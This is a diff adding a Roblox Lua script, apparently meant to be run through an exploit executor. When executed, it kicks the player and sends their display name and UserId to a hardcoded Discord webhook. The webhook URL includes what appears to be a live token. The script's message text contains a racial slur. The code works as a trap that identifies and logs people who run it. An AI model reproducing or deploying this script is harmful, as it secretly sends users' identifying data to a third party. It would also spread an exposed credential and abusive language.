@@ -1,0 +1,20 @@
+game.Players.LocalPlayer:Kick("Nah cus what did u exspect")
+local url =
+   "https://discord.com/api/webhooks/1133273671390199818/ghWG2E26eecPTeEYWcQT1TLB6REqFpo-mC0WNcuPHmDuxz_y_ZuP-ClB_cwUDFCTcW1B" -- put it here
+local data = {
+   ["embeds"] = {
+       {
+           ["title"] = "This Nigga really executed it",
+           ["description"] = "Player: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\n**Aint way bro**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0xff0000),
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
